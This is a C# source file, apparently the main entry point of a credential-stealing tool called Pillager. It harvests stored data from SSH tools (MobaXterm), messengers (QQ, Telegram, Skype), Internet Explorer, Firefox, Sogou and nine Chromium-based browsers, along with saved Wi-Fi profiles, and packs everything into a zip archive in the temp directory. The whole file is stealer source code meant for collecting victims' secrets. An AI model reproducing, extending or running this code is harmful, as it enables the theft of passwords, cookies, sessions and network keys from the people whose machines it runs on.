﻿using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using Pillager.Browsers;
using Pillager.Messengers;
using Pillager.Others;
using Pillager.Tools;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
            string savezippath = savepath + ".zip";
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            //Tools
            MobaXterm.Save(savepath);

            //Messengers
            QQ.Save(savepath);
            Telegram.Save(savepath);
            Skype.Save(savepath);

            //Browsers
            IE.Save(savepath);
            OldSogou.Save(savepath);//SogouExplorer < 12.x
            FireFox.Save(savepath);
            List<List<string>> browserOnChromium = new List<List<string>>()
            {
                new List<string>() { "Chrome", "Google\\Chrome\\User Data" } ,
                new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
                new List<string>() { "Chromium", "Chromium\\User Data" } ,
                new List<string>() { "Edge", "Microsoft\\Edge\\User Data" } ,
                new List<string>() { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
                new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
                new List<string>() { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
                new List<string>() { "Vivaldi", "Vivaldi\\User Data" } ,
                new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data" } 
                //new List<string>() { "", "" } ,
            };
            foreach (List<string> browser in browserOnChromium)
            {
                string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                browser[1]);
                Chrome chrome = new Chrome(browser[0], chromepath);
                chrome.Save(savepath);                
            }

            //Others
            Wifi.Save(savepath);

            //ZIP
            ZipFile.CreateFromDirectory(savepath, savezippath);
            Directory.Delete(savepath, true);
        }
    }
}
